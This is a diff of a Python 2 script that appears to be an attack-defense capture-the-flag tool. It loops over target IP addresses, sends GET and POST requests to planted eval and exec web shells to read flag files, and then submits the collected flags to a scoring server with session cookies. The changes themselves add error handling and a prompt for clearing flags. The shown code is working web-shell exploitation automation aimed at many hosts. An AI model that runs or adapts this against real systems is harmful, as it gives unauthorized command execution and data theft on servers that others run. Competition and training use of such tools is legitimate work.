@@ -41,24 +41,41 @@ def get_flag(ip_list):
         for j in POST_eval_shells_path_pwd:
             evel_POST_data = {POST_eval_shells_path_pwd[j]:POST_file}
             url = "http://" + i + j
-            flag = requests.post(url,data = evel_POST_data)
-            judege(flag)
+            try:
+                flag = requests.post(url,data = evel_POST_data)
+                judege(flag)
+            except:
+                print "error!"
 
         for k in GET_eval_shells_path_pwd:
             url = "http://" + i + k
-            flag = requests.get(url +"?"+ GET_eval_shells_path_pwd[k] + "=" + GET_file)
-            judege(flag)
+            try:
+                flag = requests.get(url +"?"+ GET_eval_shells_path_pwd[k] + "=" + GET_file)
+                judege(flag)
+            except:
+                print "error"
 
         for m in GET_exec_shells_path_pwd:
             url = "http://" + i + m
-            flag = requests.get(url + "?"+GET_exec_shells_path_pwd[m] + "=" + exec_file)
-            judege(flag)
+            try:
+                flag = requests.get(url + "?"+GET_exec_shells_path_pwd[m] + "=" + exec_file)
+                judege(flag)
+            except:
+                print "error"
 
         for n in POST_exec_shells_path_pwd:
             url = "http://" + i + n
             exec_POST_data = {POST_exec_shells_path_pwd[n]:exec_file}
-            flag = requests.post(url,data = exec_POST_data)
-            judege(flag)
+            try:
+                flag = requests.post(url,data = exec_POST_data)
+                judege(flag)
+            except:
+                print "error"
+
+def show_flag():
+    for i in flags:
+        print i
+
 
 #提交flag
 def submit_flag(url=url,cookies=cookies,datas=datas):
@@ -74,11 +91,23 @@ def submit_flag(url=url,cookies=cookies,datas=datas):
     for i in flags:
         data_dict[p]=i
         print i
-        a = requests.post(url,data = data_dict,cookies = cookie_dict)
-        if str(a) == check:
-            print "Submit flag success"
-        else:
-            print "submit flag failed"
+        try:
+            a = requests.post(url,data = data_dict,cookies = cookie_dict)
+            if str(a) == check:
+                print "Submit flag success"
+            else:
+                print "submit flag failed"
+        except:
+            print "something is wrong ,please check!"
 
-    print "ok,flags will auto empty"
+    print "ok,do you want to clear flag?"
+    choice=raw_input("y/n")
+    while choice not in ['y','n']:
+        print "please input 'y/n'"
+        choice = raw_input("y/n")
+    if choice =='y':
+        flags=[]
+
+def clear_flag():
+    global flags
     flags=[]
